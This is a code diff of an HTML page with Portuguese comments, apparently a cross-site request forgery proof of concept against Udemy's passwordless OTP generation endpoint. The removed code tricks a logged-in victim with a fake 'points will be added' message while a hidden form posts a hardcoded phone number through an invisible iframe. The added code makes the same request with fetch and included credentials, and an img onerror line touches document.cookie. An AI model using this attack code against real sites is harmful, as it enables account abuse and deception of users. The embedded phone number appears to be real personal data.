@@ -20,47 +20,24 @@
     </div>
     <img src="https://www.udemy.com/join/passwordless-auth/?locale=en_US" onerror="document.cookie" />
     <script>
-        function openLoginWindow() {
-            // Abre o site alvo em uma nova janela/aba
-            window.open('https://www.udemy.com/join/passwordless-auth/?locale=en_US', '_blank');
+        async function getData() {
+              const url = "https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/";
+              try {
+                const response = await fetch(url, {
+                  method: "POST",
+                  credential: "include",
+                  body: JSON.stringify({ "purpose":3,"phone_number":"+5514996810417" }),
+                });
+                if (!response.ok) {
+                  throw new Error(`Response status: ${response.status}`);
+                }
             
-            // Mostrar o próximo passo
-            document.getElementById('step1').innerHTML = '<h3>✅ Passo 1: Login iniciado</h3><p>Após fazer login, volte para esta página e continue para o próximo passo.</p>';
-            document.getElementById('step2').style.display = 'block';
-        }
-        
-        function executeCsrf() {
-            // Tenta executar o CSRF após o usuário confirmar que já fez login
-            document.getElementById('confirm-button').disabled = true;
-            document.getElementById('confirm-button').textContent = "Processando...";
-            
-            // Cria e envia o formulário para executar o CSRF
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/';
-            form.enctype = 'text/plain';
-            
-            var input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = 'Phone';
-            input.value = '14996810417';
-            form.appendChild(input);
-            
-            // Usa um iframe para não interromper a experiência
-            var iframe = document.createElement('iframe');
-            iframe.name = 'csrf-frame';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            form.target = 'csrf-frame';
-            document.body.appendChild(form);
-            form.submit();
-            
-            // Feedback visual
-            setTimeout(function() {
-                document.getElementById('step2').innerHTML = '<h3>✅ Passo 2: Dados confirmados!</h3><p>Seus pontos serão adicionados em breve. Obrigado por participar!</p>';
-            }, 1500);
-        }
+                const result = await response.json();
+                console.log(result);
+              } catch (error) {
+                console.error(error.message);
+              }
+            }
     </script>
 </body>
 </html>
